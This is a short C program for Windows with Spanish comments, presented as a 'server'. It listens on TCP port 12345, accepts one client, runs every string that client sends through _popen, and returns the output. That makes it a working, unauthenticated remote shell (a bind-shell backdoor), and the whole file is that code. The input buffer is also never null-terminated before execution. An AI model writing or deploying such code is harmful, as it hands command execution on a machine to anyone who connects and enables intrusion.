// servidor.c para Windows
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define PORT 12345
#define BUFFER_SIZE 1024

int main() {
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int addrLen = sizeof(struct sockaddr_in);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Error al inicializar Winsock");
        return EXIT_FAILURE;
    }

    if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        perror("Error al crear el socket del servidor");
        WSACleanup();
        return EXIT_FAILURE;
    }

    memset(&serverAddr, 0, sizeof(struct sockaddr_in));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("Error al vincular el socket");
        closesocket(serverSocket);
        WSACleanup();
        return EXIT_FAILURE;
    }

    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        perror("Error al escuchar por conexiones entrantes");
        closesocket(serverSocket);
        WSACleanup();
        return EXIT_FAILURE;
    }

    printf("Servidor esperando conexiones en el puerto %d...\n", PORT);

    if ((clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &addrLen)) == INVALID_SOCKET) {
        perror("Error al aceptar la conexión");
        closesocket(serverSocket);
        WSACleanup();
        return EXIT_FAILURE;
    }

    printf("Cliente conectado: %s\n", inet_ntoa(clientAddr.sin_addr));

    char buffer[BUFFER_SIZE];
    int bytesRead;

    while (1) {
        bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesRead <= 0) {
            perror("Error al recibir datos del cliente");
            break;
        }

        // Terminar el bucle si el comando es "salida"
        if (strncmp(buffer, "salida", 6) == 0) {
            break;
        }

        // Ejecutar el comando recibido
        FILE *fp;
        char result[BUFFER_SIZE] = {0};

        fp = _popen(buffer, "r");
        if (fp == NULL) {
            perror("Error al ejecutar el comando");
            break;
        }

        while (fgets(result, sizeof(result)-1, fp) != NULL) {
            // Enviar la salida del comando al cliente
            send(clientSocket, result, strlen(result), 0);
            fflush(stdout);
        }

        _pclose(fp);
    }

    // Cerrar sockets y limpiar Winsock
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}